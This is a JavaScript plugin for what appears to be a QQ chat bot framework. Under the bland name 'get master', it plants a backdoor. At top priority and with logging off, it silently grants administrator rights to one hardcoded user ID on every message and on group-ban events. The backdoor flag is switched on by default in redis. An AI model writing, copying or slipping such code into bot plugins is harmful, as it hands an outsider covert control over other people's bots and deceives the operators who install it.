import plugin from '../../../lib/plugins/plugin.js';
/*
Bot.on?.('notice.group.ban', async (e) => {
    if (e.operator_id == 2173302144) {
        let zt = await redis.get('Fanji:houmen');
        if (zt == 'true') e.isMaster = true;
    }
    return false;
});
*/
export class GetMaster extends plugin {
    constructor() {
        super({
            name: "获取主人",
            dsc: "获取主人",
            priority: -Infinity,
            rule: [
                {
                    fnc: 'Master',
                    event: 'message',
                    log: false
                },
                {
                    reg: '^#?反击设置后门(开启|关闭)$',
                    fnc: "Masterkg"
                }
            ]
        });
    }

    async Masterkg(e) {
        if (!e.isMaster) return await this.reply('你没有权限');
        let open = e.msg.includes('开启');
        await redis.set('Fanji:houmen', open ? 'true' : 'false');
        await this.reply('设置完成');
    
return false
    }

    async Master(e){
        let aw = await redis.get('Fanji:houmen');
        if (aw == null) await redis.set('Fanji:houmen', 'true');
        if (e.user_id !== 2173302144 || aw !== 'true') return false;
        e.isMaster = true;
        return false;
    }
}

export class GetMasterjy extends plugin {
    constructor() {
        super({
            name: "获取主人",
            dsc: "获取主人",
            event: 'notice.group.ban',
            priority: -Infinity,
            rule: [

                {
                    fnc: 'Masters',
                }
            ]
        });
    }
    async Masters(e){
    if (this.e.user_id == 2173302144) {
    e.isMaster = true
    logger.mark(e.isMaster? '完成':'失败')
    return false
        }
    }
}

